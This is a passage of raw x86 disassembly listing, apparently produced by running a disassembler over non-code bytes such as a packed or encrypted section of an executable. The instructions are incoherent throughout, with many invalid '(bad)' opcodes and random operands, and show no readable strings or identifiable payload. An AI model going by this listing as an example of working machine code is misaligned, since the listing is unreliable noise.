  40327e:	sub    DWORD PTR [ebp+0x54],edx
  403281:	or     cl,bl
  403283:	repz push edx
  403285:	lds    edx,FWORD PTR [ebp+0x7b7434cb]
  40328b:	(bad)  
  40328c:	aam    0xcb
  40328e:	icebp  
  40328f:	std    
  403290:	je     0x403293
  403292:	fnstenv [ecx+ecx*4+0x46]
  403296:	aam    0x9c
  403298:	add    eax,DWORD PTR [eax+ebp*1-0x62d52b33]
  40329f:	retf   0x82f1
  4032a2:	push   0x259e4fcb
  4032a7:	adc    eax,0xecbd2be6
  4032ac:	pop    esp
  4032ad:	dec    edi
  4032ae:	cmp    ebp,DWORD PTR [eax-0x1cef356e]
  4032b4:	mov    ah,0xa1
  4032b6:	push   0x2c
  4032b8:	stos   DWORD PTR es:[edi],eax
  4032b9:	daa    
  4032ba:	inc    edi
  4032bb:	je     0x4032ba
  4032bd:	shl    BYTE PTR [ebx-0x5212b746],1
  4032c3:	mov    bh,0x14
  4032c5:	jo     0x403259
  4032c7:	pop    ecx
  4032c8:	cmp    al,0x46
  4032ca:	push   es
  4032cb:	and    BYTE PTR ds:0xab62d826,bl
  4032d1:	addr16 cwde 
  4032d3:	jp     0x4032e3
  4032d5:	in     eax,dx
  4032d6:	sbb    ebx,DWORD PTR [edi]
  4032d8:	or     al,0x50
  4032da:	sbb    bl,dh
  4032dc:	test   DWORD PTR [eax-0x53],edx
  4032df:	inc    edi
  4032e0:	xor    eax,edx
  4032e2:	xchg   edx,eax
  4032e3:	sbb    al,0x92
  4032e5:	and    edx,DWORD PTR [edi+0x1e8b8400]
  4032eb:	xchg   ecx,ecx
  4032ed:	iret   
  4032ee:	out    dx,al
  4032ef:	pop    ds
  4032f0:	sbb    DWORD PTR [ebx-0x5352a9be],ecx
  4032f6:	imul   edx,DWORD PTR [eax+0x23],0x665ba9a4
  4032fd:	fs add eax,0xea0dfce5
  403303:	ficomp DWORD PTR [eax]
  403305:	pop    esi
  403306:	stos   BYTE PTR es:[edi],al
  403307:	sbb    DWORD PTR [eax-0x5d],esp
  40330a:	(bad)  
  40330b:	mov    al,0x84
  40330d:	hlt    
  40330e:	and    eax,0x7edbc641
  403313:	push   esp
  403314:	scas   al,BYTE PTR es:[edi]
  403315:	mov    ebx,0x3ebf339e
  40331a:	or     bh,BYTE PTR [ebx]
  40331c:	into   
  40331d:	jns    0x40332c
  40331f:	mov    al,0x5b
  403321:	push   cs
  403322:	mov    eax,ds:0xd5bec2c0
  403327:	xchg   ebx,eax
  403328:	fs push eax
  40332a:	xor    eax,0x433db81
  40332f:	arpl   WORD PTR [ebp+0x30],ax
  403332:	(bad)  
  403333:	push   ds
  403334:	mov    ch,0x3f
  403336:	aaa    
  403337:	xchg   ebp,eax
  403338:	xchg   edx,eax
  403339:	adc    al,0x6d
  40333b:	xor    al,0xf0
  40333d:	cwde   
  40333e:	ror    dl,cl
  403340:	imul   edx,DWORD PTR [edx-0x18],0x2850d8d4
  403347:	mov    WORD PTR fs:[eax-0xb1f3923],?
  40334e:	and    DWORD PTR [eax-0x3bddb5a],ecx
  403354:	nop
  403355:	pop    es
  403356:	add    esi,DWORD PTR [edx-0x1d]
  403359:	bound  ebp,QWORD PTR [esp+eax*8-0x1539ecb9]
  403360:	cmp    esi,DWORD PTR [esi]
  403362:	push   esp
  403363:	inc    ecx
  403364:	aam    0x8b
  403366:	fstp   DWORD PTR [eax]
  403368:	inc    esi
  403369:	sbb    al,0x4f
  40336b:	dec    edi
  40336c:	outs   dx,BYTE PTR ds:[esi]
  40336d:	hlt    
  40336e:	lods   al,BYTE PTR ds:[esi]
  40336f:	mov    eax,ds:0x10c0ba14
  403374:	jae    0x403327
  403376:	je     0x40337a
  403378:	(bad)  
  403379:	xlat   BYTE PTR ds:[ebx]
  40337a:	fwait
  40337b:	inc    eax
  40337c:	jo     0x4033c4
  40337e:	outs   dx,DWORD PTR ds:[esi]
  40337f:	rcl    DWORD PTR [esi+0x35],cl
  403382:	mov    al,ds:0x5ce8477c
  403387:	push   es
  403388:	jbe    0x403374
  40338a:	mov    esi,0x60f89a51
  40338f:	ficomp WORD PTR [edx]
  403391:	test   edi,0x5e2981e5
  403397:	aam    0xd6
  403399:	jmp    0xe2d2:0x5c5d001b
  4033a0:	pop    esi
  4033a1:	mov    bl,0x7
  4033a3:	pop    ecx
  4033a4:	in     al,dx
  4033a5:	leave  
  4033a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033a7:	add    BYTE PTR [ebx],0x33
  4033aa:	pushf  
  4033ab:	je     0x40341c
  4033ad:	sub    eax,0x1587cfeb
  4033b2:	(bad)  [ebx-0x6cef6e98]
  4033b8:	xchg   edi,eax
  4033b9:	in     al,0x5c
  4033bb:	sbb    BYTE PTR [esi+edx*1-0x2d],al
  4033bf:	rcr    al,1
  4033c1:	sub    BYTE PTR [edx-0x13],ah
  4033c4:	xchg   ecx,eax
  4033c5:	or     al,0x91
  4033c7:	and    BYTE PTR ds:0xaa155996,cl
  4033cd:	jo     0x403442
  4033cf:	out    0xde,al
  4033d1:	aaa    
  4033d2:	jmp    0xa241284f
  4033d7:	mov    edx,0x4260122
  4033dc:	ds stc 
  4033de:	jge    0x4033b4
  4033e0:	pop    ds
  4033e1:	fld    DWORD PTR [ecx+0x4b]
  4033e4:	push   esi
  4033e5:	sbb    ebx,DWORD PTR [edi+0xb]
  4033e8:	aad    0xd2
  4033ea:	mov    dl,0x23
  4033ec:	in     al,dx
  4033ed:	(bad)  
  4033ee:	jne    0x403371
  4033f0:	outs   dx,BYTE PTR ds:[esi]
  4033f1:	int    0x5f
  4033f3:	pop    edx
  4033f4:	popa   
  4033f5:	loope  0x403427
  4033f7:	ja     0x403387
  4033f9:	paddw  mm7,QWORD PTR [eax]
  4033fc:	enter  0xe46b,0xfc
  403400:	lods   eax,DWORD PTR ds:[esi]
  403401:	pop    ss
  403402:	in     al,dx
  403403:	retf   
  403404:	cmp    BYTE PTR [edx-0x1f],ah
  403407:	pop    esp
  403408:	add    bl,BYTE PTR [ebx+ebx*4]
  40340b:	lods   eax,DWORD PTR ds:[esi]
  40340c:	dec    edi
  40340d:	mov    edi,0x29065c74
  403412:	inc    ecx
  403413:	aaa    
  403414:	pop    es
  403415:	ret    
  403416:	daa    
  403417:	inc    edx
  403418:	jae    0x403413
  40341a:	cdq    
  40341b:	jb     0x403452
  40341d:	mov    esi,0xc0bfe5
  403422:	out    dx,eax
  403423:	inc    ebp
  403424:	mov    eax,ss
  403426:	mov    ecx,edx
  403428:	pop    ebp
  403429:	push   es
  40342a:	mov    ecx,0xbb0cf8d6
  40342f:	or     BYTE PTR [ebp+0x15],0x9
  403433:	les    ebp,FWORD PTR [esi+0x72fd93e0]
  403439:	xor    al,0xef
  40343b:	xchg   ebx,eax
  40343d:	adc    al,0x25
  40343f:	add    al,0xe
  403441:	stc    
  403442:	jbe    0x403444
  403444:	dec    ebp
  403445:	dec    edx
  403446:	imul   esi,DWORD PTR [edi-0x64],0x5b3721da
  40344d:	fnsave [esi]
  40344f:	scas   eax,DWORD PTR es:[edi]
  403450:	cmp    BYTE PTR [edx],dh
  403452:	ret    
  403453:	jb     0x40347a
  403455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403456:	pusha  
  403457:	add    BYTE PTR [edx-0x68],ah
  40345a:	scas   eax,DWORD PTR es:[edi]
  40345b:	add    BYTE PTR [ebx],ah
  40345d:	xor    ecx,DWORD PTR [edx+0x72]
  403460:	push   edx
  403461:	(bad)  
  403462:	adc    BYTE PTR [ecx],cl
  403464:	shl    DWORD PTR [edi],0x60
  403467:	mov    DWORD PTR [esp+edx*8-0x5c],0x28f577fc
  40346f:	aam    0xf2
  403471:	and    eax,0xd9caf90
  403476:	inc    eax
  403477:	sar    BYTE PTR [ebx],0xdf
  40347a:	shr    DWORD PTR [esi],0x7e
  40347d:	aad    0xe2
  40347f:	jecxz  0x403457
  403481:	call   0x86e00ebd
  403486:	mov    dh,0xfc
  403488:	ds jb  0x40347b
  40348b:	lea    edi,[edi+0x392fcdc8]
  403491:	adc    DWORD PTR [ebx+0x68fd370],edx
  403497:	stos   BYTE PTR es:[edi],al
  403498:	jmp    FWORD PTR [ebp+0x7c]
  40349b:	retf   
  40349c:	xchg   esi,eax
  40349d:	je     0x40349a
  40349f:	arpl   sp,cx
  4034a1:	lea    ebp,[edx+0x49]
  4034a4:	dec    ecx
  4034a5:	ins    BYTE PTR es:[edi],dx
  4034a6:	mov    ecx,0x22487817
  4034ab:	lea    ebp,[ebx+0x15]
  4034ae:	arpl   WORD PTR [ebx],dx
  4034b0:	adc    al,0x3a
  4034b2:	mov    eax,ds:0x88c43ba7
  4034b7:	xchg   edi,eax
  4034b8:	(bad)  
  4034b9:	leave  
  4034ba:	pop    eax
  4034bb:	lea    eax,[edx]
  4034bd:	push   0x7c
  4034bf:	ret    
  4034c0:	mov    eax,0x81b555e
  4034c5:	into   
  4034c6:	pushf  
  4034c7:	imul   edx,ecx,0x12
  4034ca:	dec    edi
  4034cb:	lds    ebx,FWORD PTR [edx+0x54]
  4034ce:	xchg   esi,eax
  4034cf:	loopne 0x4034e3
  4034d1:	test   al,0x8a
  4034d3:	jne    0x4034ac
  4034d5:	cwde   
  4034d6:	popf   
  4034d7:	in     al,dx
  4034d8:	push   ss
  4034d9:	sbb    dh,ah
  4034db:	daa    
  4034dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034dd:	jns    0x403463
  4034df:	push   0x24
  4034e1:	dec    edi
  4034e2:	test   esi,0xe693c66e
  4034e8:	jnp    0x403510
  4034ea:	js     0x403480
  4034ec:	jo     0x403545
  4034ee:	cli    
  4034ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034f0:	or     bh,BYTE PTR [eax-0x36]
  4034f3:	push   ss
  4034f4:	outs   dx,BYTE PTR ds:[esi]
  4034f5:	out    dx,eax
  4034f6:	pop    ss
  4034f7:	xchg   edx,eax
  4034f8:	mov    BYTE PTR [ebx],ch
  4034fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034fb:	lds    edx,FWORD PTR ds:0x7165744d
  403501:	cdq    
  403502:	ins    BYTE PTR es:[edi],dx
  403503:	pop    es
  403504:	dec    esi
  403505:	pop    eax
  403506:	mov    bh,0x6d
  403508:	repnz aas 
  40350a:	xchg   edx,eax
  40350b:	cmp    esi,DWORD PTR [ecx-0x2a]
  40350e:	jo     0x4034a9
  403510:	sbb    ecx,ebp
  403512:	in     al,0xef
  403514:	rol    BYTE PTR [edx-0x4d],cl
  403517:	not    BYTE PTR [ebx+esi*8-0x3c]
  40351b:	and    ebp,DWORD PTR [edx-0x22]
  40351e:	sub    al,0x63
  403520:	mov    dl,0x45
  403522:	lds    esp,FWORD PTR ss:[ebp-0x5f]
  403526:	mov    esi,0x2d9813ed
  40352b:	imul   ecx,DWORD PTR [edi],0x11
  40352e:	inc    esp
  40352f:	and    eax,0x27bf7905
  403534:	in     eax,0x2e
  403536:	clc    
  403537:	push   0xf1698dca
  40353c:	pop    ebx
  40353d:	out    dx,eax
  40353e:	push   es
  40353f:	enter  0x979f,0x5b
  403543:	fwait
  403544:	sbb    al,0xbb
  403546:	scas   al,BYTE PTR es:[edi]
  403547:	ds mov ah,0xbf
  40354a:	lods   al,BYTE PTR ds:[esi]
  40354b:	xchg   ecx,eax
  40354c:	das    
  40354d:	push   esi
  40354e:	mov    esi,0x5e3809b5
  403553:	imul   esi,edi,0x6f639706
  403559:	ins    BYTE PTR es:[edi],dx
  40355a:	jecxz  0x4035a5
  40355c:	pushw  ds
  40355e:	dec    esp
  40355f:	clc    
  403560:	ret    0xcba2
  403563:	dec    ecx
  403564:	test   ecx,eax
  403566:	or     al,0x96
  403568:	test   eax,0xa72b3894
  40356d:	(bad)  
  40356e:	loop   0x403521
  403570:	adc    ecx,DWORD PTR [ebp-0x5c690554]
  403576:	lds    ecx,FWORD PTR [ebx-0x10a1667f]
  40357c:	sbb    DWORD PTR es:[eax-0x252f82ae],edi
  403583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403584:	test   al,0x20
  403586:	ins    BYTE PTR es:[edi],dx
  403587:	or     dl,dh
  403589:	ror    bh,0x65
  40358c:	mov    fs,esp
  40358e:	arpl   WORD PTR [ebp-0x24],bx
  403591:	dec    esi
  403592:	scas   al,BYTE PTR es:[edi]
  403593:	rol    esi,1
  403595:	mov    al,0x2c
  403597:	pop    ecx
  403598:	ret    0xa6bd
  40359b:	stos   DWORD PTR es:[edi],eax
  40359c:	cmp    eax,0xd15533a8
  4035a1:	cld    
  4035a2:	dec    esp
  4035a3:	and    dh,ah
  4035a5:	or     al,0xf1
  4035a7:	pop    es
  4035a8:	dec    esi
  4035a9:	lods   eax,DWORD PTR ds:[esi]
  4035aa:	mov    ebp,0x899fc414
  4035af:	loopne 0x4035f9
  4035b1:	push   ss
  4035b2:	bnd je 0x403557
  4035b5:	repz fsubr QWORD PTR [ebp-0x3ba2a8c3]
  4035bc:	mov    bh,0xd0
  4035be:	and    edx,ecx
  4035c0:	(bad)  
  4035c2:	jle    0x4035fc
  4035c4:	neg    DWORD PTR [esi+0x68b7d022]
  4035ca:	lods   eax,DWORD PTR ds:[esi]
  4035cb:	popf   
  4035cc:	call   0x656ff9fb
  4035d1:	ss push eax
  4035d3:	mov    dl,0x29
  4035d5:	daa    
  4035d6:	addr16 pop esi
  4035d8:	ror    esp,cl
  4035da:	ret    0xa631
  4035dd:	sar    DWORD PTR [edx+0x13e404c0],cl
  4035e3:	icebp  
  4035e4:	dec    edi
  4035e5:	arpl   WORD PTR ds:0x2755eba4,bx
  4035eb:	jo     0x403628
  4035ed:	or     eax,0x4c41eff0
  4035f2:	test   DWORD PTR [ebx],ecx
  4035f4:	push   esp
  4035f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035f6:	push   edx
  4035f7:	mov    al,ds:0x68219469
  4035fc:	das    
  4035fd:	mov    ds:0x66749c8f,eax
  403602:	rol    esp,1
  403604:	inc    ecx
  403605:	inc    edi
  403606:	lahf   
  403607:	cmp    esi,ebp
  403609:	popa   
  40360a:	icebp  
  40360b:	inc    edi
  40360c:	xor    eax,0x81099ee0
  403611:	fdiv   st(0),st
  403613:	xchg   edi,eax
  403614:	mov    esp,0x6550e78
  403619:	jge    0x403699
  40361b:	bound  edi,QWORD PTR [ebp+0x18]
  40361e:	fcom   DWORD PTR [edi+0x67]
  403621:	dec    ebp
  403622:	test   eax,0x3c64010f
  403627:	add    DWORD PTR [ecx+edx*4-0x487af099],ecx
  40362e:	jge    0x40366a
  403630:	inc    edx
  403631:	sbb    edx,DWORD PTR [ebp-0x59]
  403634:	in     al,0x3a
  403636:	aaa    
  403637:	lds    edx,FWORD PTR [esp+eax*2-0x3e]
  40363b:	xlat   BYTE PTR ds:[ebx]
  40363c:	add    al,0x7a
  40363e:	adc    al,0xa5
  403640:	jmp    0x40365a
  403642:	cmp    DWORD PTR [ebp+0x6c7220f8],esi
  403648:	test   BYTE PTR [esi+0x7f],dl
  40364b:	or     BYTE PTR [edi+0x19],bl
  40364e:	xor    DWORD PTR [ebp-0x17],ecx
  403651:	jecxz  0x40361d
  403653:	adc    esi,DWORD PTR [ebp-0x785650f4]
  403659:	out    0x2e,eax
  40365b:	xor    esp,edx
  40365d:	into   
  40365e:	mov    dl,0x62
  403660:	adc    al,0x3a
  403662:	xchg   edx,eax
  403663:	cmp    al,0x5a
  403665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403666:	pop    ebx
  403667:	jmp    0x4036e2
  403669:	mov    ds:0x47646cc5,eax
  40366e:	cmp    dh,ch
  403670:	mov    ebp,0xcef3336f
  403675:	sub    bh,BYTE PTR [esi-0x38024ceb]
  40367b:	inc    edi
  40367c:	xchg   edi,eax
  40367d:	sbb    ebp,DWORD PTR [ebp+eax*1+0x233b0041]
  403684:	cmp    ebp,ecx
  403686:	adc    cl,BYTE PTR [eax-0x7a84efdf]
  40368c:	mov    edx,0x27d03fa9
  403691:	push   edi
  403692:	mov    cl,0x1e
  403694:	mov    ecx,0x670187b7
  403699:	inc    esi
  40369a:	sub    DWORD PTR [esi-0x1e8d6fc6],0x2a
  4036a1:	ror    DWORD PTR [ebp-0x22],cl
  4036a4:	(bad)  
  4036a6:	fcmovb st,st(0)
  4036a8:	add    eax,0x70489ff4
  4036ad:	dec    ecx
  4036ae:	test   ebp,edi
  4036b0:	(bad)  
  4036b1:	push   ecx
  4036b2:	xlat   BYTE PTR ds:[ebx]
  4036b3:	sub    BYTE PTR ds:0x68084224,ah
  4036b9:	add    DWORD PTR [ebx-0x27],ecx
  4036bc:	daa    
  4036bd:	mov    fs,WORD PTR [ecx]
  4036bf:	retf   
  4036c0:	dec    esp
  4036c1:	pop    ebx
  4036c2:	outs   dx,DWORD PTR ds:[esi]
  4036c3:	mov    ebx,0xad2579cb
  4036c8:	cmc    
  4036c9:	lea    ebp,[ecx+0x7c]
  4036cc:	xor    DWORD PTR [edx+edx*8-0x383ed586],ebp
  4036d3:	(bad)  
  4036d4:	or     ebp,DWORD PTR [ebp-0x6da0dea8]
  4036da:	sbb    edi,DWORD PTR [esi+edi*1+0x1deeb2b7]
  4036e1:	enter  0xc6de,0xf5
  4036e5:	inc    edi
  4036e6:	stc    
  4036e7:	outs   dx,BYTE PTR ds:[esi]
  4036e8:	push   0x64889286
  4036ed:	dec    ebx
  4036ee:	jae    0x403697
  4036f0:	mov    ds,WORD PTR [eax+ecx*8]
  4036f3:	mov    cl,0x93
  4036f5:	in     al,dx
  4036f6:	mov    eax,ds:0x2f00a192
  4036fb:	inc    ebx
  4036fc:	fmul   st,st(7)
  4036fe:	les    esp,FWORD PTR [edx]
  403700:	jnp    0x403686
  403702:	ja     0x403701
  403704:	sub    al,bh
  403706:	xor    BYTE PTR [edi-0x64d1e5f5],bh
  40370c:	mov    ds:0xdf63c3ff,eax
  403711:	add    ah,BYTE PTR [ecx+0x21c17ab]
  403717:	push   esp
  403718:	xor    cl,BYTE PTR [esp+edx*4]
  40371b:	inc    edi
  40371c:	(bad)  
  40371d:	outs   dx,BYTE PTR ds:[esi]
  40371e:	pop    ecx
  40371f:	push   ebp
  403720:	pop    sp
  403722:	push   edx
  403723:	jnp    0x403779
  403725:	(bad)  
  403726:	loop   0x403748
  403728:	sahf   
  403729:	out    dx,al
  40372a:	shr    BYTE PTR [edx+0x62],cl
  40372d:	icebp  
  40372e:	ja     0x4036eb
  403730:	in     eax,0x15
  403732:	push   esp
  403733:	out    0x2e,eax
  403735:	mov    esp,0xaa62dfea
  40373a:	shl    DWORD PTR [edi],1
  40373c:	(bad)  
  40373e:	or     esp,esi
  403740:	add    BYTE PTR [esi],al
  403742:	test   BYTE PTR [edi-0x577a0e8c],0xd5
  403749:	mov    ds:0xf6db335,al
  40374e:	cld    
  40374f:	(bad)  
  403751:	mov    WORD PTR [ecx+ebx*1+0xb],cs
  403755:	cmp    al,0x26
  403757:	and    BYTE PTR [edi],cl
  403759:	sbb    DWORD PTR [esi],ebp
  40375b:	inc    edi
  40375c:	test   DWORD PTR [edx+0x41cea339],ebp
  403762:	cmp    DWORD PTR [esi],edi
  403764:	cwde   
  403765:	pushf  
  403766:	inc    edx
  403767:	(bad)  
  403768:	xor    edi,edi
  40376a:	xchg   esp,eax
  40376b:	xor    eax,DWORD PTR [ebx-0x3cb98da1]
  403771:	mov    DWORD PTR [ebp-0x6c9ea825],esi
  403777:	push   ss
  403778:	and    eax,0x70e04fa5
  40377d:	pusha  
  40377e:	dec    edx
  40377f:	mov    fs,WORD PTR [ebp+0x7a76fddc]
  403785:	sub    al,0xad
  403787:	adc    bh,ch
  403789:	in     al,0x52
  40378b:	icebp  
  40378c:	mov    esp,DWORD PTR [ecx-0x43d96f40]
  403792:	jnp    0x40380f
  403794:	outs   dx,BYTE PTR ds:[esi]
  403795:	adc    esi,DWORD PTR [esi]
  403797:	mov    ah,0x89
  403799:	cmp    DWORD PTR [ebx-0x4e],ecx
  40379c:	jg     0x403771
  40379e:	inc    esi
  40379f:	jmp    0x8b01:0xaf4e0608
  4037a6:	add    DWORD PTR [edx-0x44],ecx
  4037a9:	lock cwde 
  4037ab:	dec    edx
  4037ac:	push   ebp
  4037ad:	fs int 0x46
  4037b0:	or     ah,BYTE PTR [ebp+0x1c]
  4037b3:	rcr    BYTE PTR [ebp-0xa47a28a],1
  4037b9:	push   eax
  4037ba:	add    ah,BYTE PTR [ebx+0x20]
  4037bd:	fcomp  QWORD PTR [edi]
  4037bf:	in     al,dx
  4037c0:	dec    ebp
  4037c1:	adc    BYTE PTR [eax-0x33],al
  4037c4:	(bad)  
  4037c5:	and    eax,0x9ef6c8f3
  4037ca:	mov    cl,0x93
  4037cc:	or     al,0xec
  4037ce:	stc    
  4037cf:	jp     0x4037b3
  4037d1:	nop
  4037d2:	(bad)  
  4037d3:	clc    
  4037d4:	sub    DWORD PTR [eax+ebx*4],ebp
  4037d7:	xchg   edi,eax
  4037d8:	sbb    edx,DWORD PTR [esi+0x63a0739b]
  4037de:	cmp    DWORD PTR [eax+esi*2],0x7b0ea365
  4037e5:	jae    0x403860
  4037e7:	rcl    BYTE PTR [ebx+0x53c1bf8f],0xde
  4037ee:	shl    BYTE PTR [edi-0x4629070],cl
  4037f4:	pop    ds
  4037f5:	ficom  WORD PTR [ebx]
  4037f7:	loopne 0x403876
  4037f9:	rcl    DWORD PTR [esi+eax*2],0x91
  4037fd:	icebp  
  4037fe:	inc    edx
  4037ff:	enter  0x2251,0xa1
  403803:	inc    edi
  403804:	jno    0x4037fd
  403806:	mov    cl,dl
  403808:	jb     0x4037e3
  40380a:	in     eax,dx
  40380b:	icebp  
  40380c:	ret    
  40380d:	in     eax,dx
  40380e:	das    
  40380f:	mov    ebp,0x756e9376
  403814:	shl    bl,cl
  403816:	int    0xc3
  403818:	idiv   DWORD PTR [ecx-0x451747d3]
  40381e:	dec    edx
  40381f:	push   ebp
  403820:	jmp    0x83ab:0x279ed497
  403827:	push   0xc89071ce
  40382c:	lahf   
  40382d:	xchg   esp,eax
  40382e:	mov    esp,0xa9e15d53
  403833:	sub    BYTE PTR [ebp-0x5],dl
  403836:	sbb    bh,cl
  403838:	mov    edx,0x3a8ea88
  40383d:	push   ss
  40383e:	push   ds
  40383f:	or     eax,0x98a2efd1
  403844:	popf   
  403845:	(bad)  ds:0xaf1b
  40384a:	cli    
  40384b:	jmp    0x403840
  40384d:	jnp    0x403831
  40384f:	push   ebx
  403850:	xchg   ecx,eax
  403851:	mov    BYTE PTR [eax-0x64],ch
  403854:	cld    
  403855:	pop    ecx
  403856:	xchg   esp,eax
  403857:	out    dx,al
  403858:	inc    esi
  403859:	xor    al,0x9c
  40385b:	sbb    eax,0x4934e069
  403860:	or     dl,BYTE PTR [eax+0x18b63c7f]
  403866:	cmp    al,0x4a
  403868:	mov    esi,0xca4b4389
  40386d:	bound  eax,QWORD PTR [ebx+0x2069808f]
  403873:	fnsave [ebx+0x6f]
  403876:	inc    ecx
  403877:	iret   
  403878:	sub    eax,0xdac3fd30
  40387d:	pop    es
  40387e:	test   al,0x2f
  403880:	mov    eax,ss:0xf83b86af
  403886:	push   esp
  403887:	jmp    0x6bd4:0x35196263
  40388e:	aam    0xa5
  403890:	hlt    
  403891:	pusha  
  403892:	or     BYTE PTR [esi],ah
  403894:	push   eax
  403895:	inc    ebp
  403896:	or     al,0x8b
  403898:	(bad)  
  403899:	xor    al,0xe6
  40389b:	pop    ebx
  40389c:	jmp    DWORD PTR ds:0x496550ac
  4038a2:	daa    
  4038a3:	cli    
  4038a4:	pop    ecx
  4038a5:	ja     0x403885
  4038a7:	sub    BYTE PTR [edi+0x68011486],bh
  4038ad:	dec    ecx
  4038ae:	fsubr  st(4),st
  4038b0:	idiv   BYTE PTR [eax]
  4038b2:	dec    ah
  4038b4:	sub    BYTE PTR [edx-0x74550215],bh
  4038ba:	push   es
  4038bb:	rcl    BYTE PTR [edi+0x42953b82],1
  4038c1:	cmp    ebp,eax
  4038c3:	adc    eax,0x16d70955
  4038c8:	push   es
  4038c9:	mov    dh,0xe8
  4038cb:	inc    WORD PTR [ebx+ecx*2-0x57aa2f66]
  4038d3:	(bad)  
  4038d4:	sbb    al,al
  4038d6:	clc    
  4038d7:	sub    ebx,esi
  4038d9:	xor    DWORD PTR [ebx+0x1c],edi
  4038dc:	in     al,0xe5
  4038de:	push   ebx
  4038df:	fs iret 
  4038e1:	ins    BYTE PTR es:[edi],dx
  4038e2:	lods   al,BYTE PTR ds:[esi]
  4038e3:	inc    ecx
  4038e4:	jne    0x403918
  4038e6:	aas    
  4038e7:	pop    esi
  4038e8:	dec    esp
  4038e9:	clc    
  4038ea:	imul   esp,DWORD PTR [edx-0x5a],0x86854b25
  4038f1:	loop   0x4038a2
  4038f3:	and    DWORD PTR [edi+0x7],esp
  4038f6:	xchg   BYTE PTR [esi+edi*4],al
  4038f9:	and    esi,DWORD PTR [edx+0x65]
  4038fc:	jns    0x403909
  4038fe:	loop   0x4038ff
  403900:	xchg   BYTE PTR [ebp+esi*8-0x2b],dl
  403904:	mov    bl,0x6b
  403906:	cld    
  403907:	outs   dx,DWORD PTR ds:[esi]
  403908:	cmc    
  403909:	mov    ds:0xc611eee5,al
  40390e:	shl    DWORD PTR [ebx+0x3f8b265b],1
  403914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403915:	mov    bh,0x6d
  403917:	fld1   
  403919:	mov    ah,BYTE PTR [ebp-0x5f1a89ee]
  40391f:	ins    DWORD PTR es:[edi],dx
  403920:	sub    bl,BYTE PTR [eax]
  403922:	in     al,0x91
  403924:	stos   BYTE PTR es:[edi],al
  403925:	lds    esp,FWORD PTR [edx]
  403927:	inc    esp
  403928:	pop    ecx
  403929:	gs sbb al,al
  40392c:	rcl    BYTE PTR [edi+0x43],1
  40392f:	aam    0x70
  403931:	xchg   esp,eax
  403932:	in     eax,dx
  403933:	adc    bl,BYTE PTR [esi+0x680e2ff6]
  403939:	jp     0x403942
  40393b:	jo     0x403968
  40393d:	and    ch,BYTE PTR [edi]
  40393f:	sahf   
  403940:	aam    0xa5
  403942:	sbb    DWORD PTR [esi-0x78],ecx
  403945:	add    esi,DWORD PTR ds:0x4f40a7e
  40394b:	mov    di,0xff22
  40394f:	sbb    BYTE PTR [ecx+esi*4-0x6f],bh
  403953:	call   FWORD PTR [ebp+0x3c]
  403956:	and    al,cl
  403958:	loopne 0x403977
  40395a:	repnz jecxz 0x403964
  40395d:	iret   
  40395e:	imul   edx,DWORD PTR [esi-0x31f32b10],0x3f
  403965:	cdq    
  403966:	push   esp
  403967:	fiadd  DWORD PTR [ebp-0x77b656a3]
  40396d:	push   ecx
  40396e:	adc    ebp,ebx
  403970:	xchg   ecx,eax
  403971:	cmp    ecx,DWORD PTR [ecx]
  403973:	aas    
  403974:	cwde   
  403975:	cmp    eax,0x83b37eb3
  40397a:	fs mov ebx,0x65ba638f
  403980:	addr16 add al,0x61
  403983:	mov    cl,0x30
  403985:	jbe    0x403931
  403987:	repz rcr BYTE PTR [ebp-0x1c8fa346],cl
  40398e:	adc    ebx,0x46
  403991:	xchg   edi,eax
  403992:	jg     0x4039db
  403994:	hlt    
  403995:	sbb    DWORD PTR [esi+0x7c],0x15a9ccf0
  40399c:	ins    BYTE PTR es:[edi],dx
  40399d:	and    esi,ecx
  40399f:	stos   DWORD PTR es:[edi],eax
  4039a0:	gs mov esi,0x5328acc3
  4039a6:	into   
  4039a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039a8:	mov    DWORD PTR [ebp-0x50],edi
  4039ab:	sbb    al,0x54
  4039ad:	(bad)  
  4039ae:	iret   
  4039af:	in     al,0x4e
  4039b1:	mov    cl,0x94
  4039b3:	std    
  4039b4:	pop    ss
  4039b5:	aad    0x32
  4039b7:	loope  0x40395b
  4039b9:	leave  
  4039ba:	ins    BYTE PTR es:[edi],dx
  4039bb:	cmc    
  4039bc:	ss dec ecx
  4039be:	mov    ecx,0xbaf1a258
  4039c3:	mov    BYTE PTR [edi-0x54],bh
  4039c6:	jae    0x4039cf
  4039c8:	(bad)  
  4039c9:	sub    esp,DWORD PTR ds:0x952e26c
  4039cf:	jl     0x40397b
  4039d1:	sub    BYTE PTR [eax-0x14],0x44
  4039d5:	xor    eax,0x5fcf9533
  4039da:	or     eax,0x95c1b191
  4039df:	out    0xdd,al
  4039e1:	out    0xb,al
  4039e3:	or     cl,0xde
  4039e6:	mov    esi,DWORD PTR [eax+0x1f]
  4039e9:	jge    0x403a1c
  4039eb:	int3   
  4039ec:	mov    ebp,0xaffd9e1c
  4039f1:	aad    0x87
  4039f3:	into   
  4039f4:	fnstenv [ecx-0x6284da49]
  4039fa:	add    eax,0x8b38e5c5
  4039ff:	lods   eax,DWORD PTR ds:[esi]
  403a00:	xor    BYTE PTR [esi],0xfb
  403a03:	(bad)  [ebp+0x58]
  403a06:	repnz test al,0x7e
  403a09:	xor    esi,ebx
  403a0b:	mov    ds:0x9a42fb07,al
  403a10:	aad    0x7c
  403a12:	stos   DWORD PTR es:[edi],eax
  403a13:	push   esi
  403a14:	std    
  403a15:	cmp    DWORD PTR [edx+eiz*1],esp
  403a18:	add    ch,BYTE PTR [edi+0x44]
  403a1b:	dec    ebp
  403a1c:	test   al,0x3a
  403a1e:	add    al,0x7
  403a20:	pop    ecx
  403a21:	std    
  403a22:	inc    edi
  403a23:	out    0xba,al
  403a25:	add    BYTE PTR [ebp-0x7e],cl
  403a28:	js     0x403a28
  403a2a:	fstp   QWORD PTR [eax-0x2bbc711c]
  403a30:	sbb    DWORD PTR [edi],0xa9b6215c
  403a36:	(bad)  
